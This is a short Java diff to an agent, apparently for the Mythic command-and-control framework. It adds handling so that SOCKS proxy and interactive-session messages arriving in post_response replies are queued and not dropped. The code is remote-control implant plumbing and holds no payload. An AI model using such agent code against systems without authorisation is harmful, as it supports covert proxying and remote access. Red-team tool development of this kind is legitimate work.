@@ -284,6 +284,31 @@ public class CommunicationHandler {
                     }
                 }
             }
+            
+            // Process top-level socks messages from post_response reply
+            // Mythic can include socks data in ANY response, not just get_tasking
+            // Without this, socks messages queued during the post_response round-trip are dropped
+            if (responseNode.has("socks") && responseNode.get("socks").isArray()) {
+                List<Map<String, Object>> socksList = new ArrayList<>();
+                for (JsonNode socksMsg : responseNode.get("socks")) {
+                    socksList.add(objectMapper.convertValue(socksMsg, Map.class));
+                }
+                if (!socksList.isEmpty()) {
+                    Config.debugLog(config, "Processing " + socksList.size() + " socks message(s) from post_response reply");
+                    Map<String, Object> socksWrapper = new HashMap<>();
+                    socksWrapper.put("socks", socksList);
+                    backgroundTasks.add(socksWrapper);
+                }
+            }
+            
+            // Process top-level interactive messages from post_response reply
+            if (responseNode.has("interactive") && responseNode.get("interactive").isArray()) {
+                for (JsonNode interactiveMsg : responseNode.get("interactive")) {
+                    Map<String, Object> interactiveMap = objectMapper.convertValue(interactiveMsg, Map.class);
+                    Config.debugLog(config, "Processing interactive message from post_response reply");
+                    backgroundTasks.add(interactiveMap);
+                }
+            }
         } catch (Exception e) {
             Config.debugLog(config, "Failed to parse post_response result: " + e.getMessage());
         }
